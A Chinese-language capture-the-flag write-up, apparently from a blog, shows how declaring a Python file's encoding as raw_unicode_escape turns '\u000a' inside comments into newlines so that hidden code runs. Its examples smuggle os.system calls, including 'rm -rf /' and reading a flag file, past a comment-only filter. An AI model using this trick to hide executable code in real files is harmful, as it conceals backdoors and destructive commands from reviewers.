Python隐藏在注释中的后门

![](../Images/76d1e868f27ffd24664f8ac1d85e6174.png)

  

    题目限制了我们上传的 python 文件里的代码内容，只能是 print 函数和以 `#` 代表的注释。

    Python 作为高级语言的一种，不可避免的会接触到各种各样的编码。为了避免因为编码产生的问题，最好对自己的源码处理数据的类型固定下来，这样才能避免产生一些问题。

    我们可以在 Python 文件的第一行或者第二行代码通过注释的形式设置文件编码格式，类似如下：

```
#!/usr/bin/env python
\# -\*- coding: utf-8 -\*-
#...rest of file...
```

    其中第一行是指定 Python 解释器，第二行是指定 Python 文件编码方式为 UTF-8，设置编码方式有以下可选的方法：

*   带等号的设置方法：
    

```
#!/usr/bin/python
\# coding=<encoding name>
```

*   最常见的，带冒号的设置方法（大多数编辑器都可以正确识别的）：
    

```
#!/usr/bin/python
\# -\*- coding: <encoding name> -\*-
```

    并且你可以选择使用 Python 中的任何一个编解码器，其中有一个 `raw_unicode_escape` 是我们本篇文章的主角，他允许你的 Python 文件解释 Unicode 编码的字符，比如 `\u265F` 将被解释为一个黑棋子的符号。你可以将任意的 Ascii 字符转换成 Unicode 编码，然后使用 `raw_unicode_escape` 编码器将他们解释成对应的 Ascii 字符，比如换行符 `\u000a`。这样的话我们便可以在 Python 的注释中隐藏恶意的代码了，类似如下：

```
#!/usr/bin/env python
\# -\*- coding: raw\_unicode\_escape -\*-
#\\u000aimport os
#\\u000aos.system("ls /")
#\\u000aos.system("rm -rf /")
```

    这样，由于我们指定了 Python 文件的编码格式为 `raw_unicode_escape`，那么第三到四行的注释中的 `\u000a` 便会被解释称换行符，这样后面的 Python 代码便会在注释中逃逸并得到执行：

```
#!/usr/bin/env python
\# -\*- coding: raw\_unicode\_escape -\*-
#
import os
#
os.system("ls /")
#
os.system("rm -rf /")
```

![](../Images/ce7d474c67d5cfab1170c42ab2b24df8.png)

    知道了这些知识后这个题便很简单了，就是在python的注释中隐藏我们想要执行的恶意代码，然后指定python文件编码格式为 `raw_unicode_escape` 将我们的恶意代码逃离注释并得到执行。

```
#!/usr/bin/env python
\# -\*- coding: raw\_unicode\_escape -\*-
#\\u000aimport os
#\\u000aos.system("ls /")
#\\u000aos.system("cat /\*flag\*")
```
